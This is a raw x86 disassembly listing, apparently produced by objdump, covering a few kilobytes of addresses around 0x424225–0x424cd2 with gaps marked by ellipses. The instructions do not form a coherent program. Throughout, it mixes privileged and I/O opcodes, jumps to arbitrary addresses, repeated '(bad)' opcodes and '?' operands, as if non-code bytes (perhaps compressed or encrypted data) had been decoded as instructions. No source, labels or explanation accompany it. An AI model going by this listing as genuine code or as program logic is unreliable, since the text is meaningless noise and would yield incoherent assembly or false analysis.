  424225:	arpl   WORD PTR [esi+0x3d],sp
  424228:	xchg   ecx,eax
  424229:	and    eax,0x884da425
  42422e:	mov    edi,0xd0822634
  424233:	mov    al,ds:0xdff1c247
  424238:	dec    edi
  424239:	mov    ecx,0x85d301ac
  42423e:	jmp    0xfbe8d283
  424243:	xor    al,bh
  424245:	add    esp,ebx
  424247:	shr    ecx,cl
  424249:	mov    edx,0xff627c1a
  42424e:	jmp    0x964dfa5e
  424253:	push   esp
  424254:	std    
  424255:	adc    esp,DWORD PTR [ebp-0x44efa8b9]
  42425b:	mov    esi,0xe8743052
  424260:	adc    dh,BYTE PTR [eax+0x44f3ee10]
  424266:	pop    ss
  424267:	lock mov esp,0xa28e5f44
  42426d:	add    eax,DWORD PTR [eax]
	...
  4242d3:	add    BYTE PTR [eax],al
  4242d5:	add    BYTE PTR [edi-0x4c275c4c],al
  4242db:	(bad)  
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	mov    ebp,0x67f05344
  4242e7:	test   BYTE PTR [ecx],al
  4242e9:	add    BYTE PTR [eax],al
  4242eb:	add    DWORD PTR [eax],eax
  4242ed:	add    BYTE PTR [ebx+eax*2-0x7dba20ec],bl
  4242f4:	push   eax
  4242f5:	jno    0x424345
  4242f7:	jae    0x42427e
  4242f9:	out    dx,eax
  4242fa:	fldenv [esi+0x79b3c7b4]
  424300:	push   eax
  424301:	mov    ebp,edi
  424303:	dec    ebp
  424304:	clc    
  424305:	xchg   edi,eax
  424306:	mov    al,BYTE PTR [ecx]
  424308:	inc    esp
  424309:	mov    esp,0x42f192f7
  42430e:	sub    ecx,DWORD PTR [esi]
  424310:	jl     0x4242c1
  424312:	sti    
  424313:	adc    BYTE PTR [ebx+0x71b91999],al
  424319:	mov    al,BYTE PTR [edx+edx*8]
  42431c:	xchg   edx,eax
  42431d:	fs jg  0x424375
  424320:	mov    al,cs:0x7bd1d7ec
  424326:	jg     0x424393
  424328:	inc    edi
  424329:	sub    ch,BYTE PTR [ebx+0x62]
  42432c:	rcl    BYTE PTR [edx],1
  42432e:	pop    es
  42432f:	lea    edi,[edi-0x7f5ccfab]
  424335:	data16 stc 
  424337:	cmp    eax,DWORD PTR [ebx]
  424339:	mov    esi,0x34f3b286
  42433e:	mov    ecx,edx
  424340:	int3   
  424341:	jg     0x4242d6
  424343:	and    al,0xdc
  424345:	arpl   WORD PTR [eax],bx
  424347:	push   ebx
  424348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424349:	rcl    BYTE PTR [esi],1
  42434b:	aam    0xd5
  42434d:	arpl   bp,ax
  42434f:	mov    esi,eax
  424351:	pop    esp
  424352:	in     eax,dx
  424353:	xchg   edi,eax
  424354:	addr16 pop ds
  424356:	test   al,0x78
  424358:	call   0xa096565d
  42435d:	pop    es
  42435e:	pop    esp
  42435f:	mov    esp,0xc27f7d5e
  424364:	imul   esi,esi,0x76025879
  42436a:	fsub   DWORD PTR [esi-0x47]
  42436d:	adc    cl,BYTE PTR [eax]
  42436f:	idiv   BYTE PTR [ecx-0x7]
  424372:	fsub   QWORD PTR [edx-0x2cceb7a]
  424378:	or     DWORD PTR [edi-0x4e],edi
  42437b:	rol    DWORD PTR [ebx],1
  42437d:	inc    edx
  42437e:	mul    DWORD PTR [eax-0x4439fa09]
  424384:	xor    esi,DWORD PTR [ebp+0x74]
  424387:	sub    DWORD PTR [edi+0x50],ecx
  42438a:	out    0xe8,eax
  42438c:	mov    ds:0xa973e8aa,al
  424391:	mov    ebx,0xa1a3f921
  424396:	adc    al,0xc5
  424398:	aad    0x34
  42439a:	repnz xchg edi,eax
  42439c:	fbld   TBYTE PTR [esi+0x7]
  42439f:	dec    ebp
  4243a0:	sub    bh,BYTE PTR [ebx+ecx*4+0x2f]
  4243a4:	das    
  4243a5:	test   eax,0x767ad561
  4243aa:	iret   
  4243ab:	jmp    0x4e06:0xc424974f
  4243b2:	xchg   edi,eax
  4243b3:	test   al,al
  4243b5:	out    dx,eax
  4243b6:	ins    DWORD PTR es:[edi],dx
  4243b7:	(bad)  
  4243b8:	lds    edi,FWORD PTR [edi+0x2]
  4243bb:	sub    eax,DWORD PTR [edx+0x39b932c]
  4243c1:	or     DWORD PTR [eax],ecx
  4243c3:	push   ds
  4243c4:	sub    dl,BYTE PTR [edi]
  4243c6:	add    DWORD PTR [eax+0x2c],esi
  4243c9:	in     eax,0x98
  4243cb:	mov    ecx,0x4d221528
  4243d0:	aas    
  4243d1:	fiadd  WORD PTR [ecx+0x5b]
  4243d4:	dec    eax
  4243d5:	sbb    BYTE PTR [ebx],cl
  4243d7:	add    eax,0x166ce0c4
  4243dc:	ins    DWORD PTR es:[edi],dx
  4243dd:	mov    eax,ds:0xf77706bc
  4243e2:	push   ecx
  4243e3:	xchg   esp,eax
  4243e4:	xchg   esi,eax
  4243e5:	cli    
  4243e6:	jnp    0x424395
  4243e8:	sub    eax,0xdd9d0c7
	...
  424456:	mov    ah,BYTE PTR [esi]
  424458:	jge    0x424414
  42445a:	std    
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x424418
  424463:	jne    0x42445e
  424465:	clc    
  424466:	test   DWORD PTR [bx+di],eax
  424469:	add    BYTE PTR [eax],al
  42446b:	add    DWORD PTR [eax],eax
  42446d:	add    BYTE PTR [ecx+0x1],dh
  424470:	mov    bh,0x38
  424472:	popa   
  424473:	addr16 mov bh,0x4
  424476:	(bad)  
  424478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424479:	xor    al,0x20
  42447b:	lock cmc 
  42447d:	push   edx
  42447f:	lds    edi,FWORD PTR [edx-0x15]
  424482:	mov    ah,BYTE PTR [eax+0x2de38ce7]
  424488:	fwait
  424489:	cmp    DWORD PTR [edx],0x2ec01ab7
  42448f:	iret   
  424490:	mov    al,ds:0x9ae2e4a6
  424495:	or     esi,DWORD PTR [ecx+0x15]
  424498:	cld    
  424499:	(bad)  
  42449a:	xchg   esp,eax
  42449b:	ret    
  42449c:	shl    DWORD PTR [ebx],cl
  42449e:	pop    esi
  42449f:	nop
  4244a0:	fcmovne st,st(6)
  4244a2:	les    esp,FWORD PTR ds:0x3af10eaa
  4244a8:	pop    edx
  4244a9:	gs push ds
  4244ab:	retf   
  4244ac:	or     esp,esp
  4244ae:	lods   al,BYTE PTR ds:[esi]
  4244af:	lds    esi,FWORD PTR [edx+0x3a]
  4244b2:	jo     0x4244ae
  4244b4:	(bad)  
  4244b5:	outs   dx,BYTE PTR ds:[esi]
  4244b6:	jb     0x4244d5
  4244b8:	push   0x6180ae01
  4244bd:	cmp    al,0xd5
  4244bf:	outs   dx,BYTE PTR ds:[esi]
  4244c0:	mov    ecx,0x8229087f
  4244c5:	xchg   esp,eax
  4244c6:	lods   al,BYTE PTR ds:[esi]
  4244c7:	test   DWORD PTR [edx+ecx*4-0x12067456],ebp
  4244ce:	popa   
  4244cf:	mov    cl,BYTE PTR [edi+eiz*1-0x56]
  4244d3:	cmp    ah,bh
  4244d5:	push   es
  4244d6:	sub    esi,DWORD PTR [ebp+0x4c5ed112]
  4244dc:	sbb    al,0xc2
  4244de:	scas   al,BYTE PTR es:[edi]
  4244df:	mov    ah,0x62
  4244e1:	pop    eax
  4244e2:	dec    edx
  4244e3:	mov    eax,0x40de6319
  4244e8:	sub    BYTE PTR [ebx],dh
  4244ea:	loopne 0x424514
  4244ec:	(bad)  
  4244ee:	sub    bh,BYTE PTR [eax+esi*4-0x11dbb371]
  4244f5:	mov    edx,0xbdc8dd9
  4244fa:	mov    BYTE PTR [ecx+0x6b],dl
  4244fd:	ror    BYTE PTR [ebp-0x69],0xd5
  424501:	test   DWORD PTR [ecx],edi
  424503:	inc    esi
  424504:	in     al,dx
  424505:	sub    al,0xcb
  424507:	mov    al,ds:0x35adeb16
  42450c:	jae    0x42454a
  42450e:	cli    
  42450f:	daa    
  424510:	call   0x8e1fb097
  424515:	sbb    al,0x20
  424517:	jmp    0x53d18f19
  42451c:	mov    cl,0xec
  42451e:	cmp    eax,0x9376d7b7
  424523:	fisub  DWORD PTR fs:[ebp+esi*4+0x12c5c78f]
  42452b:	adc    al,0x41
  42452d:	and    ah,BYTE PTR ds:0x61a7f1e4
  424533:	rcr    BYTE PTR [ebx],1
  424535:	push   eax
  424536:	mov    esi,0x1912ecc8
  42453b:	(bad)
  42453e:	dec    edi
  42453f:	mov    al,ds:0x225e05d7
  424545:	mov    ecx,0xb9686a09
  42454a:	and    dh,0x8
  42454d:	adc    edi,DWORD PTR [ecx+0x14]
  424550:	arpl   WORD PTR [edi],ax
  424552:	jne    0x424527
  424554:	push   cs
  424555:	(bad)  
  424556:	mov    edi,0x5051228a
  42455b:	fldl2e 
  42455d:	hlt    
  42455e:	test   ah,dh
  424560:	(bad)  
  424561:	mov    edx,0x5d1c08cb
  424566:	cdq    
  424567:	cmp    eax,0x8d824f90
  42456c:	ins    BYTE PTR es:[edi],dx
  42456d:	sub    al,0x0
	...
  4245d3:	add    BYTE PTR [eax],al
  4245d5:	add    al,ah
  4245d7:	outs   dx,DWORD PTR ds:[esi]
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4-0x29],1
  4245e3:	bound  edx,QWORD PTR [edx]
  4245e5:	sub    esp,DWORD PTR [edi-0x7a]
  4245e8:	add    DWORD PTR [eax],eax
  4245ea:	add    BYTE PTR [ecx],al
  4245ec:	add    BYTE PTR [eax],al
  4245ee:	pop    ds
  4245ef:	and    ebp,DWORD PTR [eax-0x3e75312a]
  4245f5:	mov    esi,0xda788ad8
  4245fa:	popf   
  4245fb:	mov    cl,0xb0
  4245fd:	jecxz  0x424626
  4245ff:	pop    ebx
  424600:	clc    
  424601:	dec    edx
  424602:	inc    edx
  424603:	stos   BYTE PTR es:[edi],al
  424604:	add    eax,0x8194b4aa
  424609:	idiv   BYTE PTR [ebx-0x2628256c]
  42460f:	mov    ds:0xd4dd4fb6,eax
  424614:	int3   
  424615:	mov    esp,0x602f80b0
  42461a:	test   DWORD PTR [edx-0x2034099b],0xee452809
  424624:	loopne 0x424647
  424626:	rcl    BYTE PTR [ecx+0x49],0xdf
  42462a:	mov    al,ds:0x60583e02
  42462f:	jns    0x42466a
  424631:	pop    ebx
  424632:	mov    al,0x2
  424634:	jg     0x4245e3
  424636:	aad    0xf7
  424638:	in     eax,0xdc
  42463a:	das    
  42463b:	mov    al,0x78
  42463d:	mov    ebp,0x4788c938
  424642:	inc    esp
  424643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424644:	test   eax,0xd20cb938
  424649:	dec    esp
  42464a:	dec    edx
  42464b:	js     0x424630
  42464d:	adc    BYTE PTR [edi],dh
  42464f:	hlt    
  424650:	dec    ebx
  424651:	shr    edi,cl
  424653:	jno    0x4246c0
  424655:	dec    ebx
  424656:	fild   QWORD PTR ds:0x720a0a39
  42465c:	pop    eax
  42465d:	mov    al,0x39
  42465f:	shr    DWORD PTR [edx],0xf7
  424662:	push   eax
  424663:	mov    edx,0xa69d48ad
  424668:	inc    esp
  424669:	sub    BYTE PTR [edx-0x79],ch
  42466c:	call   0xa13691a2
  424671:	cwde   
  424672:	cli    
  424673:	test   eax,esp
  424675:	cmp    eax,0xa8cb7ed4
  42467a:	pusha  
  42467b:	adc    BYTE PTR [edx],0xdc
  42467e:	je     0x42462b
  424680:	fmul   DWORD PTR [ebx+0x66df3415]
  424686:	xor    eax,0x990fb73b
  42468b:	dec    edi
  42468c:	mov    ds:0xdda31aa1,eax
  424691:	jecxz  0x42463b
  424693:	mov    ecx,0x65fb3632
  424698:	push   ebp
  424699:	and    al,0xb1
  42469b:	loope  0x424631
  42469d:	inc    ebp
  42469e:	into   
  42469f:	adc    DWORD PTR ds:0xd6e8567a,ebp
  4246a5:	push   edi
  4246a6:	mov    bl,BYTE PTR [esi]
  4246a8:	cmp    eax,0xe30157e1
  4246ad:	jp     0x424717
  4246af:	(bad)  [edx-0x6078f5f]
  4246b5:	pushf  
  4246b6:	daa    
  4246b7:	and    bh,BYTE PTR [edx-0x6ed4384b]
  4246bd:	fbstp  TBYTE PTR [esi+ebp*2+0x45]
  4246c1:	pop    DWORD PTR [eax+ebx*8+0x452d60e2]
  4246c8:	pop    esp
  4246c9:	ror    BYTE PTR gs:[edi+0x4c],1
  4246cd:	(bad)  
  4246ce:	aam    0xe2
  4246d0:	pusha  
  4246d1:	and    al,0x6b
  4246d3:	imul   esi,DWORD PTR [edi],0x9dac7028
  4246d9:	pop    eax
  4246da:	daa    
  4246db:	inc    edi
  4246dc:	xchg   edx,eax
  4246dd:	push   esp
  4246de:	out    dx,al
  4246df:	jns    0x4246dd
  4246e1:	mov    eax,ds:0x338f88aa
  4246e6:	pop    edi
  4246e7:	fwait
  4246e8:	jp     0x4246b4
  4246ea:	mov    ebp,0xc86947
	...
  424753:	add    BYTE PTR [eax],al
  424755:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    BYTE PTR ds:0x678f2f45,cl
  424767:	xchg   DWORD PTR [ecx],eax
  424769:	add    BYTE PTR [eax],al
  42476b:	add    DWORD PTR [eax],eax
  42476d:	add    BYTE PTR [edi],ah
  42476f:	(bad)  
  424770:	fmul   DWORD PTR [ecx]
  424772:	cmp    BYTE PTR [ebx],ch
  424774:	lock data16 jnp 0x4247e9
  424778:	iret   
  424779:	xchg   esi,eax
  42477a:	mov    ds:0x25d2febb,eax
  42477f:	repnz icebp 
  424781:	enter  0xc42b,0x10
  424785:	mov    ecx,esi
  424787:	div    DWORD PTR [esi-0x2c]
  42478a:	fucomp st(4)
  42478c:	in     eax,0xec
  42478e:	xchg   BYTE PTR [ecx-0x42253eb1],ch
  424794:	test   al,0x6a
  424796:	arpl   WORD PTR [ecx-0x44ad035a],cx
  42479c:	lods   eax,DWORD PTR ds:[esi]
  42479d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42479e:	adc    BYTE PTR [ecx-0x11],cl
  4247a1:	dec    esi
  4247a2:	retf   
  4247a3:	push   ss
  4247a4:	jbe    0x424739
  4247a6:	sbb    al,0x8a
  4247a8:	xchg   ebp,eax
  4247a9:	jne    0x42477c
  4247ab:	sub    cl,BYTE PTR [ecx]
  4247ad:	xor    eax,0x36e9f8c4
  4247b2:	pushf  
  4247b3:	push   0xc92add0e
  4247b8:	inc    ebx
  4247b9:	and    al,BYTE PTR [esi+0x169f2f6b]
  4247bf:	and    ah,al
  4247c1:	sahf   
  4247c2:	cld    
  4247c3:	inc    edi
  4247c4:	jne    0x4247be
  4247c6:	and    al,0xb8
  4247c8:	pop    edx
  4247c9:	or     BYTE PTR [eax+0x79704eac],ah
  4247cf:	or     BYTE PTR [esi+ebx*4-0xa],0xc7
  4247d4:	cmp    bh,BYTE PTR [ebp+0x15]
  4247d7:	mov    al,ds:0xf38480a8
  4247dc:	jmp    0x4247db
  4247de:	and    al,0x1f
  4247e0:	inc    edx
  4247e1:	sbb    DWORD PTR [esi+ebx*2-0x56],edx
  4247e5:	dec    ebx
  4247e6:	lea    ebx,[esi]
  4247e8:	cmp    eax,eax
  4247ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247eb:	ds jb  0x42481b
  4247ee:	xchg   ebp,eax
  4247ef:	xor    ecx,ebp
  4247f1:	pcmpgtb mm0,mm3
  4247f4:	adc    DWORD PTR [ebx+0x24da8e48],0xffffffe1
  4247fb:	or     eax,0x12105b93
  424800:	jp     0x424872
  424802:	push   ebp
  424803:	xchg   ecx,eax
  424804:	inc    esi
  424805:	(bad)  
  424806:	fucomp st(2)
  424808:	sti    
  424809:	in     eax,0x8e
  42480b:	daa    
  42480c:	dec    edi
  42480d:	add    BYTE PTR [ebx+0x68ae967],0xd7
  424814:	add    dh,dh
  424816:	jle    0x4247e3
  424818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424819:	aad    0x8d
  42481b:	imul   ebx,DWORD PTR [edi],0x12
  42481e:	mov    cl,0xe9
  424820:	stos   DWORD PTR es:[edi],eax
  424821:	(bad)  
  424822:	int3   
  424823:	repz test bl,ah
  424826:	push   0xffffffc5
  424828:	sub    dh,cl
  42482a:	arpl   si,sp
  42482c:	aam    0xbf
  42482e:	sbb    DWORD PTR [esi-0x70e4fc67],ebx
  424834:	xor    esi,DWORD PTR [esi+0x2d]
  424837:	mov    ebx,0x67909011
  42483c:	pop    ebx
  42483d:	cmp    al,0xa9
  42483f:	mov    ds:0x28669ff6,eax
  424844:	or     al,0x4e
  424846:	(bad)  
  424847:	sub    esp,DWORD PTR [edx-0x2e]
  42484a:	das    
  42484b:	jo     0x4248ab
  42484d:	pop    ds
  42484e:	jmp    0x9628:0xfb5f1641
  424855:	scas   al,BYTE PTR es:[edi]
  424856:	sbb    dh,BYTE PTR [edx+0x20299c73]
  42485c:	lahf   
  42485d:	popa   
  42485e:	loope  0x424810
  424860:	mov    eax,0x7d9c427d
  424865:	xor    al,0x69
  424867:	call   0xfc046d5d
  42486c:	addr16 out 0x0,al
	...
  4248d3:	add    BYTE PTR [eax],al
  4248d5:	add    BYTE PTR [edx],ah
  4248d7:	pop    eax
  4248d8:	test   bh,ch
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	xor    cl,ah
  4248e4:	sub    BYTE PTR [edx+0x18867],bh
  4248ea:	add    BYTE PTR [ecx],al
  4248ec:	add    BYTE PTR [eax],al
  4248ee:	inc    esi
  4248ef:	aam    0x89
  4248f1:	ret    0x9aa6
  4248f4:	aam    0x33
  4248f6:	dec    ecx
  4248f7:	(bad)  
  4248f8:	xchg   edx,eax
  4248f9:	sbb    eax,0x881929d
  4248fe:	das    
  4248ff:	push   esp
  424900:	aam    0x7e
  424902:	lods   al,BYTE PTR ds:[esi]
  424903:	inc    edi
  424904:	push   DWORD PTR [esi-0x37e6abca]
  42490a:	inc    ecx
  42490b:	jo     0x42492d
  42490d:	fmul   DWORD PTR [ecx]
  42490f:	cmc    
  424910:	mov    dh,0x73
  424912:	push   ds
  424913:	loopne 0x4248d3
  424915:	jge    0x4248d3
  424917:	dec    esi
  424918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424919:	mov    dh,0x82
  42491b:	(bad)  
  42491c:	(bad)  [ebp+0x33]
  42491f:	push   ebx
  424920:	aam    0x72
  424922:	(bad)  
  424923:	test   eax,0x882c4adc
  424928:	aad    0xb3
  42492a:	and    DWORD PTR cs:[edi],0xffffffae
  42492e:	ja     0x4248b2
  424930:	lahf   
  424931:	lock mov bh,0x40
  424934:	push   0xffffffc7
  424936:	adc    dl,ah
  424938:	cmp    esi,DWORD PTR [ebx]
  42493a:	mov    al,BYTE PTR [edx+0x64]
  42493d:	inc    ebx
  42493e:	pop    ebx
  42493f:	ja     0x42495b
  424941:	test   BYTE PTR [esi],bh
  424943:	mov    ch,0x87
  424945:	int    0x93
  424947:	cld    
  424948:	rcl    BYTE PTR [esi-0x156e6c5a],1
  42494e:	test   BYTE PTR [edx],bl
  424950:	jb     0x4248dd
  424952:	fisub  DWORD PTR [edx+0x35]
  424955:	mov    bl,0x7a
  424957:	je     0x424935
  424959:	push   ebx
  42495a:	mov    bl,0x36
  42495c:	adc    DWORD PTR [edx+0x7d],esp
  42495f:	mov    dh,0x75
  424961:	xor    DWORD PTR [esi-0xa3b13ac],ebx
  424967:	add    edi,eax
  424969:	dec    ebx
  42496a:	xor    eax,DWORD PTR [ebp-0x1d]
  42496d:	sub    eax,0x885ec818
  424972:	ins    DWORD PTR es:[edi],dx
  424973:	popf   
  424974:	into   
  424975:	dec    ecx
  424976:	mov    edx,0x42eec616
  42497b:	aam    0xfe
  42497d:	jo     0x424919
  42497f:	aam    0x6b
  424981:	(bad)  
  424982:	clc    
  424983:	hlt    
  424984:	or     WORD PTR [ebx+0x44],cx
  424988:	fwait
  424989:	call   0xf4ab:0xb8afe953
  424990:	adc    dh,BYTE PTR [ebp+0x5b696cc]
  424996:	mov    ebx,0x9d455b5d
  42499b:	gs adc al,0x7d
  42499e:	not    DWORD PTR [ecx-0x67]
  4249a1:	sub    ebx,DWORD PTR [edi-0x61e1272f]
  4249a7:	jne    0x424a03
  4249a9:	add    eax,esp
  4249ab:	jmp    0x97d9b0e2
  4249b0:	out    dx,eax
  4249b1:	push   eax
  4249b2:	jmp    0x5bf52150
  4249b7:	pop    esi
  4249b8:	lea    edi,[ebp+0x4574dbc1]
  4249be:	cmp    eax,0x3b9c1228
  4249c3:	cmp    dl,BYTE PTR [esi]
  4249c5:	clc    
  4249c6:	out    0x4,eax
  4249c8:	inc    ecx
  4249c9:	mov    ch,0xab
  4249cb:	stos   DWORD PTR es:[edi],eax
  4249cc:	mov    WORD PTR [edx-0x64f05090],?
  4249d2:	cwde   
  4249d3:	out    dx,eax
  4249d4:	dec    DWORD PTR [eax]
  4249d6:	or     dh,BYTE PTR [eax]
  4249d8:	in     eax,0xcf
  4249da:	xor    ah,ah
  4249dc:	mov    dh,0x63
  4249de:	popa   
  4249df:	stc    
  4249e0:	scas   eax,DWORD PTR es:[edi]
  4249e1:	rcl    DWORD PTR [edi-0x45],0xc5
  4249e5:	rcr    BYTE PTR [eax+0x2d44e299],0x29
  4249ec:	add    DWORD PTR [ecx+0x0],eax
	...
  424a53:	add    BYTE PTR [eax],al
  424a55:	add    BYTE PTR [ebx+0x18],ch
  424a58:	arpl   WORD PTR [edx+0x73],bp
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    dl,BYTE PTR [edi]
  424a63:	add    ebx,DWORD PTR [edi]
  424a65:	push   ebp
  424a66:	mov    DWORD PTR [bx+di],eax
  424a69:	add    BYTE PTR [eax],al
  424a6b:	add    DWORD PTR [eax],eax
  424a6d:	add    dh,ch
  424a6f:	icebp  
  424a70:	mov    dh,0xf7
  424a72:	loope  0x424a30
  424a74:	test   BYTE PTR [edx+ebp*2-0x4ff4864],dl
  424a7b:	stos   DWORD PTR es:[edi],eax
  424a7c:	aad    0x99
  424a7e:	imul   ebx,DWORD PTR ds:0x5730b825,0xffffff9a
  424a85:	test   al,0x0
  424a87:	icebp  
  424a88:	scas   eax,DWORD PTR es:[edi]
  424a89:	(bad)  
  424a8a:	pop    ss
  424a8b:	out    0xe9,eax
  424a8d:	dec    edx
  424a8e:	fimul  WORD PTR [ebx-0x31]
  424a91:	push   es
  424a92:	pop    es
  424a93:	sub    bl,BYTE PTR [eax]
  424a95:	xor    eax,0xcc32846
  424a9a:	fistp  DWORD PTR [bp+si-0x125f]
  424a9f:	icebp  
  424aa0:	les    eax,FWORD PTR [esi-0x17a7c0e2]
  424aa6:	mov    ecx,0xece037d6
  424aab:	js     0x424a3f
  424aad:	loopne 0x424aa2
  424aaf:	ja     0x424ae4
  424ab1:	lods   al,BYTE PTR ds:[esi]
  424ab2:	(bad)  
  424ab3:	xchg   edi,eax
  424ab4:	push   DWORD PTR [edi+ebp*4-0x59bb6361]
  424abb:	retf   0x80b1
  424abe:	int3   
  424abf:	sub    ebx,DWORD PTR [esi+ebp*2]
  424ac2:	adc    ebx,edx
  424ac4:	push   es
  424ac5:	fild   QWORD PTR [eax]
  424ac7:	and    al,0xbf
  424ac9:	js     0x424b37
  424acb:	stc    
  424acc:	push   0x8358c9d3
  424ad1:	xchg   edi,eax
  424ad2:	mov    bh,0x41
  424ad4:	mov    ds:0x138245bf,al
  424ad9:	or     DWORD PTR [ebx],esp
  424adb:	iret   
  424adc:	loope  0x424a60
  424ade:	cdq    
  424adf:	mov    ah,0x3b
  424ae1:	xor    esp,edx
  424ae3:	fcomp  DWORD PTR [ecx+0x4f]
  424ae6:	ja     0x424a79
  424ae8:	pop    eax
  424ae9:	xchg   BYTE PTR [ecx+0x38a241d9],ah
  424aef:	xor    edx,esi
  424af1:	mov    esi,0xefade62
  424af6:	bound  ecx,QWORD PTR [edx+0x20035a62]
  424afc:	jmp    0x81075a5
  424b01:	fidivr DWORD PTR fs:[eax-0x55421bd5]
  424b08:	push   cs
  424b09:	sbb    esp,ebp
  424b0b:	ins    BYTE PTR es:[edi],dx
  424b0c:	push   ss
  424b0d:	mov    ebx,?
  424b0f:	aas    
  424b10:	test   al,0x3f
  424b12:	jl     0x424b0b
  424b14:	(bad)  
  424b15:	sub    BYTE PTR ds:[ebp-0x7],bh
  424b19:	mov    cl,0xcd
  424b1b:	mov    al,ds:0xae20cd68
  424b20:	xchg   ebp,eax
  424b21:	loop   0x424b36
  424b23:	mov    ds:0x96182ba2,al
  424b28:	(bad)  
  424b29:	jne    0x424b34
  424b2b:	inc    edx
  424b2c:	or     DWORD PTR [edi-0x5d],esp
  424b2f:	push   es
  424b30:	sub    DWORD PTR [eax],0x1295f388
  424b36:	(bad)  
  424b37:	adc    al,BYTE PTR [esi-0x69]
  424b3a:	je     0x424b5c
  424b3c:	mov    ecx,0xf2c3d513
  424b41:	psadbw mm0,QWORD PTR [edx+0x63]
  424b45:	jne    0x424b2b
  424b47:	mov    ds:0x3f90ba22,eax
  424b4c:	or     DWORD PTR ds:0x622096e5,ebp
  424b52:	or     al,0xf6
  424b54:	inc    eax
  424b55:	arpl   WORD PTR ds:0x7f304f10,dx
  424b5b:	pop    es
  424b5c:	xchg   ebp,eax
  424b5d:	dec    esp
  424b5e:	push   DWORD PTR [ebx]
  424b60:	jl     0x424ae3
  424b62:	addr16 add eax,0xf4b2ea86
  424b68:	mov    dh,0xe2
  424b6a:	sbb    al,0x6
  424b6c:	inc    edx
  424b6d:	mov    al,ds:0x0
	...
  424bd6:	push   es
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	inc    edi
  424be3:	push   ds
  424be4:	xor    BYTE PTR [edi+eiz*2+0x18a],cl
  424beb:	add    DWORD PTR [eax],eax
  424bed:	add    dl,dh
  424bef:	loopne 0x424c66
  424bf1:	aad    0xf4
  424bf3:	test   DWORD PTR [ebp-0x423b2ef9],edi
  424bf9:	icebp  
  424bfa:	icebp  
  424bfb:	cmp    BYTE PTR [ebp-0x6f],dh
  424bfe:	ins    DWORD PTR es:[edi],dx
  424bff:	dec    ecx
  424c00:	sar    BYTE PTR [ecx],1
  424c02:	add    bh,BYTE PTR [edi-0x18]
  424c05:	test   eax,0xc93c2c97
  424c0a:	push   ecx
  424c0b:	xchg   ecx,eax
  424c0c:	pop    edx
  424c0d:	mov    ds:0xba63c359,eax
  424c12:	arpl   WORD PTR [ecx],cx
  424c14:	inc    ecx
  424c15:	push   esi
  424c16:	sub    al,0xe4
  424c18:	sbb    edi,edx
  424c1a:	mov    ecx,0xe25aac69
  424c1f:	pop    eax
  424c20:	enter  0x2d73,0x57
  424c24:	push   esi
  424c25:	data16 daa 
  424c27:	inc    esi
  424c28:	dec    ebp
  424c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c2a:	cli    
  424c2b:	jle    0x424c53
  424c2d:	adc    ah,BYTE PTR es:[ebx+0x5]
  424c31:	mov    eax,ds:0x92b30d09
  424c36:	sbb    WORD PTR [ebx+0x1c],0x12
  424c3b:	(bad)  
  424c3c:	xchg   ebx,eax
  424c3d:	out    0xab,eax
  424c3f:	fistp  WORD PTR [edi+0x22d004ed]
  424c45:	in     al,dx
  424c46:	sub    al,0xfb
  424c48:	and    DWORD PTR [ebx-0x50],ebx
  424c4b:	xor    eax,0x4d86437e
  424c50:	sbb    eax,0x6adf067d
  424c55:	mov    bh,0x8a
  424c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c58:	push   esp
  424c59:	imul   ecx,DWORD PTR [eax+eiz*4],0x4
  424c5d:	je     0x424bea
  424c5f:	xor    al,0x53
  424c61:	shr    BYTE PTR [eax],cl
  424c63:	jge    0x424ccd
  424c65:	adc    al,0x24
  424c67:	xor    DWORD PTR [esi+0x5a62a85e],ebp
  424c6d:	sbb    eax,0xc16ab3f3
  424c72:	dec    edx
  424c73:	(bad)  
  424c74:	fld    TBYTE PTR [edx-0x44]
  424c77:	xchg   ecx,eax
  424c78:	jg     0x424bfe
  424c7a:	shr    BYTE PTR [ebp-0x1496918f],0x9f
  424c81:	xor    eax,0xfdf3a824
  424c86:	jg     0x424d03
  424c88:	jne    0x424ce3
  424c8a:	in     eax,0x77
  424c8c:	mov    gs,WORD PTR [esi+0x1c]
  424c8f:	jo     0x424d0f
  424c91:	ret    0x7865
  424c94:	pop    ebx
  424c95:	or     BYTE PTR [esi+edi*2-0x147716c7],bl
  424c9c:	jle    0x424c4e
  424c9e:	jno    0x424c74
  424ca0:	(bad)  
  424ca1:	pop    edi
  424ca2:	fldenv [edx-0x37273704]
  424ca8:	fistp  WORD PTR [edx+0x10]
  424cab:	je     0x424c4b
  424cad:	stc    
  424cae:	xchg   esi,eax
  424caf:	aas    
  424cb0:	jg     0x424c8d
  424cb2:	fcmovbe st,st(5)
  424cb4:	div    BYTE PTR es:[edx+0x1d6e7536]
  424cbb:	es adc al,0xf6
  424cbe:	adc    dh,dl
  424cc0:	cmp    edi,DWORD PTR [eax-0x19]
  424cc3:	shl    BYTE PTR [esi],1
  424cc5:	addr16 pop es
  424cc7:	xor    eax,0x75b38222
  424ccc:	mov    al,0xe2
  424cce:	cmp    bh,0x24
  424cd1:	push   edi
  424cd2:	dec    ebp
